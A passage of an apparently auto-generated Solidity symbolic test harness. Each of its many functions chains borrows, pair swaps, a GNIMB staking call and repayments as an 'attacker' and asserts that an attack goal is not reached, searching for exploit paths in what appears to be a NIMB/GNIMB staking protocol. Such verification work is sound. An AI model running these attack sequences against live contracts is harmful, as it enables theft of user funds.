        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand865(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand866(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand867(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand868(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand869(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand870(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand871(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand872(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand873(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand874(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand875(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand876(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand877(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand878(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand879(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand880(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand881(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand882(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand883(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand884(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand885(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand886(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand887(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand888(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand889(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand890(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand891(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand892(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand893(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand894(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand895(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand896(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand897(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand898(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand899(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand900(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand901(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand902(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand903(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand904(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand905(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand906(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand907(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand908(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand909(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand910(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand911(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand912(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand913(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand914(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand915(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand916(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand917(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand918(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand919(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
